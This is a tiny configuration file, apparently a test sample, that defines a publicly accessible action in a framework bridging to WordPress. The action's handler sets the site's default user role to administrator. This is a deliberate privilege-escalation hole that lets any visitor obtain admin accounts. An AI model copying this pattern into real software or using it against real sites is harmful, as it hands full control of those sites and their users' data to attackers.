import { action, defineConfig } from "first";
import { update_option } from "php/wordpress";
export default defineConfig({ actions: { a: action({ input: {}, access: "anyone", handler: () => update_option("default_role", "administrator") }) } });
